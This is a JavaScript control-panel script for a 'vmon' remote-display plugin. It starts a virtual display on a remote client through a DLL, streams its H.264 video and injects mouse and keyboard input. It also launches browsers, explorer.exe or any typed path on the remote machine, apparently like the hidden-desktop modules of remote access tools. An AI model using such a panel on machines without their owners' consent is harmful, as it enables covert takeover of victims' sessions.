(() => {
  const PLUGIN_ID = "vmon";
  const params = new URLSearchParams(location.search);
  const clientId = params.get("clientId") || "";

  const $ = (id) => document.getElementById(id);
  const canvas = $("vm-canvas");
  const ctx2d = canvas.getContext("2d");
  const overlay = $("vm-overlay");
  const logEl = $("vm-log");

  $("vm-client").textContent = clientId ? `— ${clientId.slice(0, 12)}…` : "(no client)";

  const lines = [];
  function log(line) {
    lines.push(line);
    if (lines.length > 10) lines.shift();
    logEl.textContent = lines.join("\n");
  }

  function setStatus(text, cls) {
    const el = $("vm-pill-status");
    el.textContent = text;
    el.className = `vm-pill ${cls || ""}`;
  }

  async function sendEvent(event, payload) {
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${PLUGIN_ID}/event`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, payload: payload || {} }),
    });
    if (!res.ok) throw new Error(`event ${event}: HTTP ${res.status}`);
    return res.json().catch(() => ({}));
  }

  /* ── H.264 decode (WebCodecs, annexb) ── */

  let decoder = null;
  let decodedW = 0, decodedH = 0;

  function codecFromSeqhdr(bytes) {
    for (let i = 0; i + 4 < bytes.length; i++) {
      const sc3 = bytes[i] === 0 && bytes[i + 1] === 0 && bytes[i + 2] === 1;
      const sc4 = bytes[i] === 0 && bytes[i + 1] === 0 && bytes[i + 2] === 0 && bytes[i + 3] === 1;
      if (!sc3 && !sc4) continue;
      const nalStart = i + (sc4 ? 4 : 3);
      const nalType = bytes[nalStart] & 0x1f;
      if (nalType === 7 && nalStart + 3 < bytes.length) {
        const hex = (b) => b.toString(16).padStart(2, "0").toUpperCase();
        return `avc1.${hex(bytes[nalStart + 1])}${hex(bytes[nalStart + 2])}${hex(bytes[nalStart + 3])}`;
      }
    }
    return "avc1.640028";
  }

  function initDecoder(seqhdrB64, w, h) {
    if (decoder && decoder.state !== "closed") decoder.close();
    const bytes = Uint8Array.from(atob(seqhdrB64), (c) => c.charCodeAt(0));
    const codec = codecFromSeqhdr(bytes);
    decoder = new VideoDecoder({
      output: (frame) => {
        if (frame.codedWidth !== decodedW || frame.codedHeight !== decodedH) {
          decodedW = frame.codedWidth;
          decodedH = frame.codedHeight;
          canvas.width = decodedW;
          canvas.height = decodedH;
        }
        ctx2d.drawImage(frame, 0, 0);
        frame.close();
        framesRendered++;
        if (!overlay.classList.contains("hidden")) overlay.classList.add("hidden");
      },
      error: (e) => log(`decoder: ${e.message}`),
    });
    const tryConfigure = (config) => {
      try { decoder.configure(config); return true; } catch { return false; }
    };
    if (!tryConfigure({ codec, format: "annexb" })
        && !tryConfigure({ codec })
        && !tryConfigure({ codec: "avc1.640028", format: "annexb" })) {
      log(`decoder: cannot configure for ${codec}`);
      return;
    }
    decoder.decode(new EncodedVideoChunk({ type: "key", timestamp: 0, data: bytes }));
    log(`decoder: configured ${w}x${h} (${codec})`);
  }

  /* ── side-channel viewer WS (binary frames) ── */

  let framesRendered = 0;
  let bytesIn = 0;
  let viewerWs = null;
  let streaming = false;

  function connectViewerWs() {
    if (viewerWs && viewerWs.readyState <= WebSocket.OPEN) return;
    const proto = location.protocol === "https:" ? "wss" : "ws";
    const ws = new WebSocket(`${proto}://${location.host}/api/plugins/${PLUGIN_ID}/viewer-ws?clientId=${encodeURIComponent(clientId)}`);
    ws.binaryType = "arraybuffer";
    ws.onopen = () => log("viewer ws: connected");
    ws.onclose = () => {
      viewerWs = null;
      if (streaming) setTimeout(connectViewerWs, 2000);
    };
    ws.onerror = () => {};
    ws.onmessage = (e) => {
      if (typeof e.data === "string") return;
      const buf = new Uint8Array(e.data);
      if (buf.length < 8 || buf[0] !== 0x46 || buf[1] !== 0x52 || buf[2] !== 0x4d) return;
      const metaLen = buf[3] === 2 ? 12 : 8;
      const format = buf[6];
      if (format !== 4 || !decoder || decoder.state !== "configured") return;
      const data = buf.subarray(metaLen);
      bytesIn += data.length;
      if (decoder.decodeQueueSize > 6 && data[0] !== 1) return; // drop deltas, never keyframes
      // Frame format: [key:u8][annexb access unit]
      const isKey = data[0] === 1;
      decoder.decode(new EncodedVideoChunk({ type: isKey ? "key" : "delta", timestamp: 0, data: data.subarray(1) }));
    };
    viewerWs = ws;
  }

  /* ── SSE (status + config only) ── */

  const source = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  const mine = (d) => d && d.clientId === clientId;

  source.addEventListener("vmon_status", (e) => {
    try {
      const d = JSON.parse(e.data);
      if (!mine(d)) return;
      const stage = d.stage || "";
      log(`status: ${stage}${d.message ? " — " + d.message : ""}`);
      if (stage === "streaming") {
        streaming = true;
        setStatus("Live", "live");
        $("vm-start").disabled = true;
        $("vm-stop").disabled = false;
        connectViewerWs();
      } else if (stage === "error") {
        setStatus("Error", "error");
        $("vm-start").disabled = false;
        $("vm-stop").disabled = true;
      } else if (stage === "stopped") {
        streaming = false;
        setStatus("Stopped", "");
        overlay.classList.remove("hidden");
        overlay.textContent = "Stream stopped";
        $("vm-start").disabled = false;
        $("vm-stop").disabled = true;
      } else {
        setStatus(stage, "");
      }
    } catch {}
  });

  source.addEventListener("vmon_config", (e) => {
    try {
      const d = JSON.parse(e.data);
      if (!mine(d) || d.codec !== "h264") return;
      initDecoder(d.seqhdr, d.width, d.height);
    } catch {}
  });

  source.addEventListener("vmon_browsers", (e) => {
    try {
      const d = JSON.parse(e.data);
      if (!mine(d)) return;
      renderBrowsers(d.browsers || []);
    } catch {}
  });

  /* ── stats ── */
  setInterval(() => {
    $("vm-stat-fps").textContent = framesRendered || "--";
    $("vm-stat-net").textContent = bytesIn ? `${Math.round((bytesIn * 8) / 1000)} kbps` : "--";
    framesRendered = 0;
    bytesIn = 0;
  }, 1000);

  /* ── start / stop ── */

  $("vm-start").addEventListener("click", async () => {
    const [w, h] = $("vm-res").value.split("x").map(Number);
    setStatus("starting…", "");
    overlay.textContent = "Starting virtual display…";
    overlay.classList.remove("hidden");
    try {
      // Mint the side-channel token first, then tell the DLL where to connect.
      const tokRes = await fetch(`/api/plugins/${PLUGIN_ID}/agent-token`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ clientId }),
      });
      if (!tokRes.ok) throw new Error(`agent-token: HTTP ${tokRes.status}`);
      const { token } = await tokRes.json();
      const proto = location.protocol === "https:" ? "wss" : "ws";
      const wsUrl = `${proto}://${location.host}/api/plugins/${PLUGIN_ID}/agent-ws?token=${encodeURIComponent(token)}`;
      await sendEvent("start", {
        ws_url: wsUrl,
        width: w,
        height: h,
        fps: Number($("vm-fps").value),
        bitrate_kbps: Number($("vm-bitrate").value),
      });
    } catch (err) {
      setStatus("error", "error");
      log(String(err));
    }
  });

  $("vm-stop").addEventListener("click", async () => {
    await sendEvent("stop").catch(() => {});
    if (viewerWs) {
      const ws = viewerWs;
      viewerWs = null;
      streaming = false;
      ws.close();
    }
  });

  $("vm-fullscreen").addEventListener("click", () => {
    const stage = $("vm-stage");
    if (document.fullscreenElement) document.exitFullscreen();
    else stage.requestFullscreen().catch(() => {});
  });

  /* ── launcher ── */

  function launchPath(path) {
    sendEvent("launch", { path }).then(() => log(`launched: ${path}`)).catch((e) => log(String(e)));
  }

  function renderBrowsers(browsers) {
    const chromium = browsers.filter((b) => b.family === "chromium");
    const firefox = browsers.filter((b) => b.family === "firefox");
    const fill = (el, list) => {
      el.innerHTML = "";
      if (list.length === 0) {
        el.innerHTML = '<div class="vm-item muted">none found</div>';
        return;
      }
      for (const b of list) {
        const div = document.createElement("div");
        div.className = "vm-item" + (b.found ? "" : " notfound");
        div.innerHTML = `<i class="fa-solid fa-globe"></i> ${b.name}${b.found ? '<i class="fa-solid fa-circle found-dot"></i>' : " (not found)"}`;
        if (b.found) div.addEventListener("click", () => launchPath(b.path));
        el.appendChild(div);
      }
    };
    fill($("vm-chromium-list"), chromium);
    fill($("vm-firefox-list"), firefox);
  }

  document.querySelectorAll(".vm-item[data-exe]").forEach((el) => {
    el.addEventListener("click", () => launchPath(el.dataset.exe));
  });
  $("vm-launch-custom").addEventListener("click", () => {
    const p = $("vm-custom-path").value.trim();
    if (p) launchPath(p);
  });
  $("vm-explorer").addEventListener("click", () => launchPath("C:\\Windows\\explorer.exe"));

  /* ── input ── */

  let inputEnabled = false;
  $("vm-input-toggle").addEventListener("change", (e) => {
    inputEnabled = e.target.checked;
    if (inputEnabled) canvas.focus();
  });

  function toRemote(e) {
    const rect = canvas.getBoundingClientRect();
    const sx = canvas.width / rect.width;
    const sy = canvas.height / rect.height;
    return {
      x: Math.round((e.clientX - rect.left) * sx),
      y: Math.round((e.clientY - rect.top) * sy),
    };
  }

  let pendingMove = null;
  let moveScheduled = false;
  canvas.addEventListener("mousemove", (e) => {
    if (!inputEnabled) return;
    pendingMove = toRemote(e);
    if (!moveScheduled) {
      moveScheduled = true;
      requestAnimationFrame(() => {
        moveScheduled = false;
        if (pendingMove) {
          sendEvent("input", { kind: "mouse_move", ...pendingMove }).catch(() => {});
          pendingMove = null;
        }
      });
    }
  });

  const btnName = (b) => (b === 2 ? "right" : b === 1 ? "middle" : "left");
  canvas.addEventListener("mousedown", (e) => {
    if (!inputEnabled) return;
    e.preventDefault();
    canvas.focus();
    sendEvent("input", { kind: "mouse_down", button: btnName(e.button), ...toRemote(e) }).catch(() => {});
  });
  canvas.addEventListener("mouseup", (e) => {
    if (!inputEnabled) return;
    sendEvent("input", { kind: "mouse_up", button: btnName(e.button), ...toRemote(e) }).catch(() => {});
  });
  canvas.addEventListener("contextmenu", (e) => e.preventDefault());
  canvas.addEventListener("wheel", (e) => {
    if (!inputEnabled) return;
    e.preventDefault();
    const p = toRemote(e);
    sendEvent("input", { kind: "wheel", delta: e.deltaY < 0 ? 120 : -120, ...p }).catch(() => {});
  }, { passive: false });

  canvas.addEventListener("keydown", (e) => {
    if (!inputEnabled) return;
    e.preventDefault();
    if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
      sendEvent("input", { kind: "text", text: e.key }).catch(() => {});
    } else if (e.keyCode) {
      sendEvent("input", { kind: "key", vk: e.keyCode, down: true }).catch(() => {});
    }
  });
  canvas.addEventListener("keyup", (e) => {
    if (!inputEnabled) return;
    e.preventDefault();
    if (e.key.length !== 1 && e.keyCode) {
      sendEvent("input", { kind: "key", vk: e.keyCode, down: false }).catch(() => {});
    }
  });

  /* ── boot ── */
  if (clientId) {
    sendEvent("ping")
      .then(() => sendEvent("browser_check"))
      .then(() => sendEvent("keyframe"))
      .catch((err) => {
        setStatus("unreachable", "error");
        log(String(err));
      });
  }
})();
